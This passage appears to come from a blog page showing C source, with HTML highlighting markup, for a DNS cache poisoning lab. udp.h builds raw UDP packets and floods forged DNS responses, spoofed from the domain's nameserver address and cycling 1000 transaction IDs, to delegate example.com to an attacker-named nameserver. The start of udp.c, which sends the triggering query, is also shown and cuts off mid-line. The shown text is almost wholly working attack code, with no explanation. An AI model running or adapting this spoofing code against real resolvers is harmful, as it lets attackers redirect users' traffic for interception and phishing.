class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//udp.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/udp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PCKT_LEN 8192</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG_R 0x8400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG_Q 0x0100</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_ihl:<span class="number">4</span>, iph_ver:<span class="number">4</span>;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_tos;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_len;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_ident;</span><br><span class="line"> <span class="comment">//    unsigned char      iph_flag;</span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_offset;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_ttl;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span>      iph_protocol;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> iph_chksum;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">int</span>       iph_sourceip;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">int</span>       iph_destip;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// UDP header&#x27;s structure</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span> &#123;</span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> udph_srcport;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> udph_destport;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> udph_len;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> udph_chksum;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dnsheader</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> query_id;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> QDCOUNT;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ANCOUNT;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> NSCOUNT;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ARCOUNT;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// This structure just for convinience in the DNS packet, because such 4 byte data often appears. </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dataEnd</span>&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>  type;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>  <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line">    <span class="comment">// total udp header length: 8 bytes (=64 bits)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// structure to hold the answer end section</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ansEnd</span>&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> type;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ttl_l;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ttl_h;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> datalen;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="comment">// structure to hold the authorative nameserver end section</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nsEnd</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> type;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> <span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ttl_l;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> ttl_h;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> datalen;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checksum</span><span class="params">(<span class="keyword">uint16_t</span> *usBuff, <span class="keyword">int</span> isize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cksum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(;isize&gt;<span class="number">1</span>;isize-=<span class="number">2</span>)	cksum+=*usBuff++;</span><br><span class="line">	<span class="keyword">if</span>(isize==<span class="number">1</span>)	 cksum+=*(<span class="keyword">uint16_t</span> *)usBuff;</span><br><span class="line">	<span class="keyword">return</span> (cksum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate udp checksum</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">check_udp_sum</span><span class="params">(<span class="keyword">uint8_t</span> *buffer, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">tempI</span>=</span>(struct ipheader *)(buffer);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span> *<span class="title">tempH</span>=</span>(struct udpheader *)(buffer+<span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dnsheader</span> *<span class="title">tempD</span>=</span>(struct dnsheader *)(buffer+<span class="keyword">sizeof</span>(struct ipheader)+<span class="keyword">sizeof</span>(struct udpheader));</span><br><span class="line">	tempH-&gt;udph_chksum=<span class="number">0</span>;</span><br><span class="line">	sum=checksum( (<span class="keyword">uint16_t</span> *)   &amp;(tempI-&gt;iph_sourceip) ,<span class="number">8</span> );</span><br><span class="line">	sum+=checksum((<span class="keyword">uint16_t</span> *) tempH,len);</span><br><span class="line">	sum+=ntohs(IPPROTO_UDP+len);</span><br><span class="line">	sum=(sum&gt;&gt;<span class="number">16</span>)+(sum &amp; <span class="number">0x0000ffff</span>);</span><br><span class="line">	sum+=(sum&gt;&gt;<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">uint16_t</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Function for checksum calculation. From the RFC,</span></span><br><span class="line"><span class="comment">// the checksum algorithm is:</span></span><br><span class="line"><span class="comment">//  &quot;The checksum field is the 16 bit one&#x27;s complement of the one&#x27;s</span></span><br><span class="line"><span class="comment">//  complement sum of all 16 bit words in the header.  For purposes of</span></span><br><span class="line"><span class="comment">//  computing the checksum, the value of the checksum field is zero.&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">csum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *buf, <span class="keyword">int</span> nwords)</span></span></span><br><span class="line"><span class="function"></span>&#123;       <span class="comment">//</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> sum;</span><br><span class="line">        <span class="keyword">for</span>(sum=<span class="number">0</span>; nwords&gt;<span class="number">0</span>; nwords--)        sum += *buf++;</span><br><span class="line">        sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp;<span class="number">0xffff</span>);</span><br><span class="line">        sum += (sum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//construct response packet</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">response</span><span class="params">(<span class="keyword">char</span>* req_url, <span class="keyword">char</span>* src_addr, <span class="keyword">char</span>* des_addr)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sd;</span><br><span class="line">	<span class="keyword">char</span> buffer[PCKT_LEN];</span><br><span class="line">	<span class="built_in">memset</span>(buffer, <span class="number">0</span>, PCKT_LEN);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (struct ipheader *) buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span> *<span class="title">udp</span> =</span> (struct udpheader *) (buffer + <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dnsheader</span> *<span class="title">dns</span>=</span>(struct dnsheader*) (buffer +<span class="keyword">sizeof</span>(struct ipheader)+<span class="keyword">sizeof</span>(struct udpheader));</span><br><span class="line"> <span class="keyword">int</span> t = <span class="keyword">sizeof</span>(struct ipheader)+<span class="keyword">sizeof</span>(struct udpheader)+<span class="keyword">sizeof</span>(struct dnsheader);</span><br><span class="line"><span class="comment">//	printf(&quot;t=%d,iphead=%d,udphead=%d,dnshead=%d\n&quot;,t,sizeof(struct ipheader),sizeof(struct udpheader),sizeof(struct dnsheader));</span></span><br><span class="line">    <span class="keyword">char</span> *data=(buffer + t);</span><br><span class="line">    dns-&gt;flags = htons(FLAG_R);</span><br><span class="line">    dns-&gt;QDCOUNT=htons(<span class="number">1</span>);</span><br><span class="line">    dns-&gt;ANCOUNT=htons(<span class="number">1</span>);</span><br><span class="line">    dns-&gt;NSCOUNT=htons(<span class="number">1</span>);</span><br><span class="line">    dns-&gt;ARCOUNT=htons(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(data,req_url);</span><br><span class="line">    <span class="keyword">int</span> length = <span class="built_in">strlen</span>(data) + <span class="number">1</span>;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dataEnd</span> * <span class="title">end</span>=</span>(struct dataEnd *)(data+length);</span><br><span class="line">    end-&gt;type=htons(<span class="number">1</span>);</span><br><span class="line">    end-&gt;<span class="class"><span class="keyword">class</span>=</span>htons(<span class="number">1</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;data=%s\n&quot;,data);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *ans=(buffer +t+<span class="keyword">sizeof</span>(struct dataEnd)+length);</span><br><span class="line">    <span class="built_in">strcpy</span>(ans,req_url);</span><br><span class="line">	<span class="comment">//printf(&quot;ans=%s\n&quot;,ans);</span></span><br><span class="line">    <span class="keyword">int</span> anslength = <span class="built_in">strlen</span>(ans) + <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ansEnd</span> * <span class="title">ansend</span> =</span> (struct ansEnd *)(ans + anslength);</span><br><span class="line">    ansend-&gt;type = htons(<span class="number">1</span>);</span><br><span class="line">    ansend-&gt;<span class="class"><span class="keyword">class</span> =</span> htons(<span class="number">1</span>);</span><br><span class="line">    ansend-&gt;ttl_l = htons(<span class="number">0x00</span>);</span><br><span class="line">    ansend-&gt;ttl_h = htons(<span class="number">0xFFFF</span>);</span><br><span class="line">    ansend-&gt;datalen=htons(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">char</span> *ansaddr=(buffer +t+<span class="keyword">sizeof</span>(struct dataEnd)+length+<span class="keyword">sizeof</span>(struct ansEnd)+anslength);</span><br><span class="line">	<span class="built_in">strcpy</span>(ansaddr,<span class="string">&quot;\xac\x11&quot;</span>);       <span class="comment">//172.17. //\x00\x01</span></span><br><span class="line">	*(ansaddr+<span class="number">3</span>) = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> addrlen = <span class="built_in">strlen</span>(ansaddr)+<span class="number">2</span>;   <span class="comment">//dispose /0 problem</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *ns =(buffer +t+<span class="keyword">sizeof</span>(struct dataEnd)+length+<span class="keyword">sizeof</span>(struct ansEnd)+anslength+addrlen);</span><br><span class="line">	<span class="built_in">strcpy</span>(ns,<span class="string">&quot;\7example\3com&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> nslength= <span class="built_in">strlen</span>(ns)+<span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nsEnd</span> * <span class="title">nsend</span>=</span>(struct nsEnd *)(ns+nslength);</span><br><span class="line">	nsend-&gt;type=htons(<span class="number">2</span>);</span><br><span class="line">	nsend-&gt;<span class="class"><span class="keyword">class</span>=</span>htons(<span class="number">1</span>);</span><br><span class="line">    nsend-&gt;ttl_l=htons(<span class="number">0x00</span>);</span><br><span class="line">    nsend-&gt;ttl_h=htons(<span class="number">0xFFFF</span>);   <span class="comment">//tll,ŒŽÓÐÐ§µÄÊ±Œä</span></span><br><span class="line">    nsend-&gt;datalen=htons(<span class="number">21</span>); </span><br><span class="line">	<span class="keyword">char</span> *nsname=(buffer +t+<span class="keyword">sizeof</span>(struct dataEnd)+length+<span class="keyword">sizeof</span>(struct ansEnd)+anslength+addrlen+<span class="keyword">sizeof</span>(struct nsEnd)+nslength);</span><br><span class="line">	<span class="built_in">strcpy</span>(nsname,<span class="string">&quot;\2ns\7huyiman\3net&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> nsnamelen = <span class="built_in">strlen</span>(nsname)+<span class="number">1</span>;</span><br><span class="line">	</span><br><span class="line"> 	<span class="keyword">char</span> *ar=(buffer +t+<span class="keyword">sizeof</span>(struct dataEnd)+length+<span class="keyword">sizeof</span>(struct ansEnd)+anslength+addrlen+<span class="keyword">sizeof</span>(struct nsEnd)+nslength+nsnamelen);</span><br><span class="line">    <span class="built_in">strcpy</span>(ar,<span class="string">&quot;\2ns\7huyiman\3net&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> arlength = <span class="built_in">strlen</span>(ar)+<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ansEnd</span>* <span class="title">arend</span> =</span> (struct ansEnd*)(ar + arlength);</span><br><span class="line">    arend-&gt;type = htons(<span class="number">1</span>);</span><br><span class="line">    arend-&gt;<span class="class"><span class="keyword">class</span>=</span>htons(<span class="number">1</span>);</span><br><span class="line">    arend-&gt;ttl_l=htons(<span class="number">0x00</span>);</span><br><span class="line">    arend-&gt;ttl_h=htons(<span class="number">0xFFFF</span>);</span><br><span class="line">    arend-&gt;datalen=htons(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">char</span> *araddr=(buffer +t+<span class="keyword">sizeof</span>(struct dataEnd)+length+<span class="keyword">sizeof</span>(struct ansEnd)+anslength+addrlen+<span class="keyword">sizeof</span>(struct nsEnd)+nslength+nsnamelen+arlength+<span class="keyword">sizeof</span>(struct ansEnd));</span><br><span class="line">    <span class="built_in">strcpy</span>(araddr,<span class="string">&quot;\xac\x11&quot;</span>);</span><br><span class="line">    *(araddr+<span class="number">3</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> araddrlen = <span class="built_in">strlen</span>(araddr) + <span class="number">2</span>;	</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>, <span class="title">din</span>;</span>  	 <span class="keyword">int</span> one = <span class="number">1</span>; 	 <span class="keyword">const</span> <span class="keyword">int</span> *val = &amp;one;</span><br><span class="line">    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);</span><br><span class="line">    <span class="keyword">if</span>(sd&lt;<span class="number">0</span> ) 	<span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line">    <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">    din.sin_family = AF_INET;</span><br><span class="line">    <span class="built_in">sin</span>.sin_port = htons(<span class="number">33333</span>);</span><br><span class="line">    din.sin_port = htons(<span class="number">53</span>);</span><br><span class="line">    <span class="built_in">sin</span>.sin_addr.s_addr = inet_addr(src_addr);</span><br><span class="line">    din.sin_addr.s_addr = inet_addr(<span class="string">&quot;199.43.133.53&quot;</span>);</span><br><span class="line">    ip-&gt;iph_ihl = <span class="number">5</span>; </span><br><span class="line">    ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">    ip-&gt;iph_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> packetLength =(<span class="keyword">sizeof</span>(struct ipheader) + <span class="keyword">sizeof</span>(struct udpheader)+<span class="keyword">sizeof</span>(struct dnsheader)+length+<span class="keyword">sizeof</span>(struct dataEnd)+anslength+<span class="keyword">sizeof</span>( struct ansEnd)+nslength+<span class="keyword">sizeof</span>(struct nsEnd)+addrlen+nsnamelen+arlength+<span class="keyword">sizeof</span>(struct ansEnd)+araddrlen); <span class="comment">// length + dataEnd_size == UDP_payload_size</span></span><br><span class="line">    ip-&gt;iph_len=htons(packetLength);</span><br><span class="line">    ip-&gt;iph_ident = htons(rand());</span><br><span class="line">    ip-&gt;iph_ttl = <span class="number">110</span>;</span><br><span class="line">    ip-&gt;iph_protocol = <span class="number">17</span>;</span><br><span class="line">    ip-&gt;iph_sourceip = inet_addr(<span class="string">&quot;199.43.133.53&quot;</span>);</span><br><span class="line">    ip-&gt;iph_destip = inet_addr(src_addr);</span><br><span class="line">    udp-&gt;udph_srcport = htons(<span class="number">53</span>);</span><br><span class="line">    udp-&gt;udph_destport = htons(<span class="number">33333</span>);</span><br><span class="line">    udp-&gt;udph_len = htons(<span class="keyword">sizeof</span>(struct udpheader)+<span class="keyword">sizeof</span>(struct dnsheader)+length+<span class="keyword">sizeof</span>(struct dataEnd)+anslength+<span class="keyword">sizeof</span>( struct ansEnd)+nslength+<span class="keyword">sizeof</span>(struct nsEnd)+addrlen+nsnamelen+arlength+<span class="keyword">sizeof</span>(struct ansEnd)+araddrlen); <span class="comment">// udp_header_size + udp_payload_size</span></span><br><span class="line">	ip-&gt;iph_chksum = csum((<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buffer, <span class="keyword">sizeof</span>(struct ipheader) + <span class="keyword">sizeof</span>(struct udpheader));</span><br><span class="line">	udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-<span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">	<span class="keyword">if</span>(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, <span class="keyword">sizeof</span>(one))&lt;<span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);    </span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">1000</span>;</span><br><span class="line">	<span class="keyword">int</span> trans_id = <span class="number">3000</span>;</span><br><span class="line">	<span class="keyword">while</span>(count--)&#123; </span><br><span class="line">	   dns-&gt;query_id=htons(trans_id+count);</span><br><span class="line">    	udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-<span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">	    <span class="keyword">if</span>(sendto(sd, buffer, packetLength, <span class="number">0</span>, (struct sockaddr *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	        <span class="built_in">printf</span>(<span class="string">&quot;packet send error %d which means %s\n&quot;</span>,errno,strerror(errno));</span><br><span class="line"></span><br><span class="line">   	&#125;</span><br><span class="line">   	close(sd);</span><br><span class="line">   	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//udp.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;udp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> srcip <span class="meta-string">&quot;172.17.0.1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dstip <span class="meta-string">&quot;172.17.0.2&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sd;</span><br><span class="line">    <span class="keyword">char</span> buffer[PCKT_LEN];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, PCKT_LEN);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (struct ipheader *) buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span> *<span class="title">udp</span> =</span> (struct udpheader *) (buffer + <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dnsheader</span> *<span class="title">dns</span>=</span>(struct dnsheader*) (buffer +<span class="keyword">sizeof</span>(struct ipheader)+<span class="keyword">sizeof</span>(struct udpheader));</span><br><span class="line"><span class="comment">// data is the pointer points to the first byte of the dns payload  </span></span><br><span class="line">    <span class="keyword">char</span> *data=(buffer +<span class="keyword">sizeof</span>(struct ipheader)+<span class="keyword">sizeof</span>(struct udpheader)+<span class="keyword">sizeof</span>(struct dnsheader));</span><br><span class="line">    dns-&gt;flags=htons(FLAG_Q);</span><br><span class="line">    dns-&gt;QDCOUNT=htons(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(data,<span class="string">&quot;\5aaaaa\7example\3com&quot;</span>);</span><br><span class="line"> <span class="comment">//   strcpy(data,&quot;\3www\7example\3com&quot;);</span></span><br><span class="line">    <span class="keyword">int</span> length= <span class="built_in">strlen</span>(data)+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//this is for convinience to get the struct type write the 4bytes in a more organized way.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dataEnd</span> * <span class="title">end</span>=</span>(struct dataEnd *)(data+length);</span><br><span class="line">    end-&gt;type=htons(<span class="number">1</span>);</span><br><span class="line">    end-&gt;<span class="class"><span class="keyword">class</span>=</span>htons(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>, <span class="title">din</span>;</span></span><br><span class="line">    <span class="keyword">int</span> one = <span class="number">1</span>; 	<span class="keyword">const</span> <span class="keyword">int</span> *val = &amp;one;</span><br><span class="line">   dns-&gt;query_id=htons(rand()); <span class="comment">// transaction ID for the query packet, use random #</span></span><br><span class="line">    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);</span><br><span class="line">	<span class="keyword">if</span>(sd&lt;<span class="number">0</span>) 	<span class="built_in">printf</span>(<span class="string">&quot;socket error\n&quot;</span>);</span><br><span class="line">    <span class="comment">// The source is redundant, may be used later if needed</span></span><br><span class="line"></span><br><span class="line">    din.sin_family = AF_INET;</span><br><span class="line">    din.sin_port = htons(<span class="number">53</span>);</span><br><span class="line">    din.sin_addr.s_addr = inet_addr(dstip); </span><br><span class="line">    ip-&gt;iph_ihl = <span class="number">5</span>; ip-&gt;iph_ver = <span class="number">4</span>; ip-&gt;iph_tos = <span class="number">0</span>; <span class="comment">// Low delay</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> packetLength =(<span class="keyword">sizeof</span>(struct ipheader) + <span class="keyword">sizeof</span>(struct udpheader)+<span class="keyword">sizeof</span>(struct dnsheader)+length+<span class="keyword">sizeof</span>(struct dataEnd)); </span><br><span class="line">    ip-&gt;iph_len=htons(packetLength);</span><br><span class="line">    ip-&gt;iph_ident = htons(rand()); <span class="comment">// we give a random number for the identification#</span></span><br><span class="line">    ip-&gt;iph_ttl = <span class="number">110</span>; <span class="comment">// hops</span></span><br><span class="line">    ip-&gt;iph_protocol = <span class="number">17</span>; <span class="comment">// UDP</span></span><br><span class="line">    <span class="comment">// Source IP address, can use spoofed address here!!!</span></span><br><span class="line">    ip-&gt;iph_sourceip = inet_addr(srcip);	<span class="comment">//&quot;172.17.0.1&quot;-&gt;&quot;172.17.0.2&quot;</span></span><br><span class="line">    <span class="comment">// The destination IP address</span></span><br><span class="line">    ip-&gt;iph_destip = inet_addr(dstip);  <span 